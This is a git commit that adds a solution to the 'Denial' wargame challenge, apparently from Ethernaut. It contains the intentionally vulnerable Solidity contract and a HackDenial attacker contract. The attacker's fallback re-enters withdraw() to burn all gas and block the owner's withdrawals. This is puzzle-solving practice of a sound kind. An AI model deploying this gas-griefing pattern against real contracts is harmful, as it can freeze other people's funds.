4c3265e1d462a2ded9637522738f0fadd707afd6
adnpark <aidenp.dev@gmail.com>
2022-09-29 22:15:39 +0900

    add solution of Denial

---
+++ contracts/Denial.sol
@@ -0,0 +1,57 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Denial {
+
+    using SafeMath for uint256;
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address payable public constant owner = address(0xA9E); // 0x0000000000000000000000000000000000000A9e
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance.div(100);
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        owner.transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = now;
+        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+contract HackDenial {
+    Denial public denial;
+
+    function setDeinalContract(address denial_) public {
+        denial = Denial(denial_);
+    }
+
+    function setPartner() public {
+        denial.setWithdrawPartner(this);
+    }
+
+    function callWithdraw() public {
+        denial.withdraw();
+    }
+
+    fallback() payable external {
+        callWithdraw();
+    }
+}
